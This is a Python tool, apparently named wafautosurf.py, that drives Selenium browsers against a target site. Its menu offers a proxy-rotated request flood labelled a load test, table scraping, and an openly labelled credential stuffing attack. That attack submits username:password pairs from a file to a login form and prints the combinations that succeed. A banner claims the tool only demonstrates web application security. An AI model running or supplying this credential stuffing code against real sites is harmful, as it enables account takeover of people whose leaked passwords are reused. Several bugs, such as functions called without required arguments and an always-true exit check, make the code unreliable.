import time, platform, sys, getopt, validators, random, threading, requests, os, csv
from selenium import webdriver 
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from bs4 import BeautifulSoup
import pandas as pd

def main():
    url = ''
    trials = ''
    try:
        opts, arg = getopt.getopt(sys.argv[1:],"u:t:")
        for opt, arg in opts:
            if opt == '-u':
                url = str(arg)
            elif opt == '-t':
                try:
                    trials = int(arg)
                except ValueError:
                    print ("Enter a valid number for trials")
                return url, trials  #returns these variables to be used as inputs in other functions
    except getopt.GetoptError as e:
        print (e, 'python wafautosurf.py -u <Host URL> -t <No of Trials>')
        sys.exit(2)

def bot_broswing(url, trials):
    #Start automated browsing after validating the url
    if validators.url(url) and trials > 0:
        auto_surf(trials)
    else:
        print ("Check the input parameters for url and no. of trials")
        print ('python wafautosurf.py -u <Host URL> -t <No of Trials>')

def select_browser(pltOS):
    # plt = platform.system()

    try:
        '''Drivers downloaded from https://chromedriver.chromium.org/
        and placed inside ./drivers/ or .\drivers\.'''
        if pltOS == 'Darwin':
            # #Adding diversification to MacOS to choose randomly between Chrome and Firefox
            '''I was hopinh that something like the following would work for this:
            #############
            chrome = webdriver.Chrome(executable_path="./drivers/mac/chromedriver")
            firefox = webdriver.Chrome(executable_path="./drivers/mac/geckodriver")
            browser = random.choice(webdriver.Chrome(executable_path="./drivers/mac/chromedriver"), webdriver.Chrome(executable_path="./drivers/mac/geckodriver"))
            return browser
            #############
            But Selenium is painful to work with'''

            browser_name = random.choice(os.listdir("./drivers/mac"))
            print (f"Using {browser_name} Driver")
            driver_path = os.path.join("./drivers/mac/", browser_name)
            if browser_name == "geckodriver":
                browser = webdriver.Firefox(executable_path=f"{driver_path}")
                return browser
            else:
                browser = webdriver.Chrome(executable_path=f"{driver_path}")
                return browser

        elif pltOS == 'Linux':
            browser_name = random.choice(os.listdir("./drivers/linux"))
            print (f"Using {browser_name} Driver")
            driver_path = os.path.join("./drivers/linux/", browser_name)
            if browser_name == "geckodriver":
                browser = webdriver.Firefox(executable_path=f"{driver_path}")
                return browser
            else:
                browser = webdriver.Chrome(executable_path=f"{driver_path}")
                return browser

        elif pltOS == 'Windows':
            browser_name = random.choice(os.listdir(".\drivers\windows"))
            print (f"Using {browser_name} Driver")
            driver_path = os.path.join(".\drivers\Windows", browser_name)
            if browser_name == "geckodriver.exe":
                browser = webdriver.Firefox(executable_path=f"{driver_path}")
                return browser
            else:
                browser = webdriver.Chrome(executable_path=f"{driver_path}")
                return browser
    except:
        print ("Place driver for browser in drivers directory. This can be downloaded from https://chromedriver.chromium.org/")
        return

def login(username, password):
    try:
        driver = select_browser() #Call function to set browser driver
        driver.get (url) #URL is defined in universal variable from main()
        time.sleep(1)
        #use credential dictionary file
        driver.find_element_by_name('username').send_keys(username)
        element = driver.find_element_by_name('password')
        element.send_keys(password)
        element.send_keys(Keys.RETURN)
        print(f'***SUCCESSFUL*** Login: {driver.current_url}, {username}, {password}\n')
        driver.quit()

    except Exception as v:
        print (f'Failed Login: {v}, {username}, {password}\n')

def scrape_data(url, ticker):
    driver = select_browser()
    driver.get(url)
    time.sleep(1)

# Find the first table on the page and start scraping - 
# not too sophisticated but should be good enough for illustration
    '''Start the browser, input a search, and look for tables
    In this example, we are using AAPL as the input criteria'''
    try:
        print (ticker)
        element = driver.find_element_by_name('search')
        element.send_keys(ticker)
        element.send_keys(Keys.RETURN)
        time.sleep(1)
        soup = BeautifulSoup(driver.page_source, 'lxml')
        if (soup.find_all('table')) == []: #If <table> tag is not found on page, then take screenshot
            takescreenshot(driver)
            print ("No tables found to be scraped but we took screenshots")
            driver.quit()
        else:
        # Find table on the page and start scraping
            tab_data = soup.select('table')[1]
            #Parse the data from the table to CSV using pandas library
            n = 0
            item = []
            file_path = "./data/scraped.csv"
            while n <= 5: #Scrape the first 5 rows (this is enough for illustration)
                for items in tab_data.select('tr'):
                    item = [elem.text for elem in items.select('th,td')]
                    item.append
                n += 1
                print (item)
                df = pd.DataFrame(item)
                df.to_csv(file_path, index=False, header=False)

    except NoSuchElementException as e:
        takescreenshot(driver)
        print (e, "**ALERT** 'Search' element could not be found. Check that the site is active")


def takescreenshot(driver):
    #Screenshots saved under ./data folder
    randnum = random.randint(0,20)
    screenshot_path = f'./data/screenshot{randnum}.png'
    driver.save_screenshot(screenshot_path)
    return


def scrape():
    search_list = ["GOOG", "AAPL", "TMUS", "T", "NKE"]
    for ticker in search_list:
        scrape_data(url, ticker)


def auto_surf(trials):
    n = 1
    while n <= trials:
        scrape()
        n += 1
        print (f'Round {n-1} of {trials} automated browsing of {url}')


def cred_spray():
    #Grap credentials from specified file and use for padding
    with open('./data/accounts.txt', 'r') as f:
        for line in f:
            combo = line.strip('\r\n').split(':')
            username = combo[0]
            password = combo[1]
            '''use the credentials within the login function to 
            brute force with the credentials'''
            login(username, password)
        return

def load_test():
    #Test code
    n = 0
    while n < 200:
        proxy = pick_proxy()
        p = f"http://{proxy}"
        r = requests.get(url,p)
        n += 1
        print (f"Response Code: {r.status_code},\n, Cookie: {r.cookies}, Using Proxy: {p}")


def pick_proxy():
    if pltOS == 'Windows':
        proxies = csv.reader(open('.\data\proxies.csv', 'r'))
        get_proxy = sum((proxy for proxy in proxies), [])
        proxy = random.choice(get_proxy)
        return (proxy)
    else:
        proxies = csv.reader(open('./data/proxies.csv', 'r'))
        get_proxy = sum((proxy for proxy in proxies), [])
        proxy = random.choice(get_proxy)
        return (proxy)


def menu():
    menu=True
    while menu:
        print("""
        ** Caution: Still under development.
        This tool is not intended to be used for nefarious activities.
        The solve purpose of its inception is to measure show the value of in-depth web application security

        1. Basic Automated Load Test using Requests - simple load test using 'python requests'
        2. Scrape Content - scrapes tables
        3. Credential Stuffing Attack - #first configure dictionary in data/accounts.txt
        4. Exit/Quit
        """)

        menu=input("What would you like to do? ")
        if menu=="1":
            print("\n Basic Automated Load Test using Requests")
            load_test()
        elif menu=="2":
            print("\n Launching Content Scraping")
            print (f'Content is now being scrapped from {url}')
            bot_broswing(url, trials)
        elif menu=="3":
            print("\n Credential Stuffing Attack")
            cred_spray()
        elif menu=="4" or "q":
            break
        elif menu == None:
            print("\n Not Valid Choice Try again")

if __name__ == "__main__":
    pltOS = platform.system()
    url, trials = main()
    menu()
    # pick_proxy()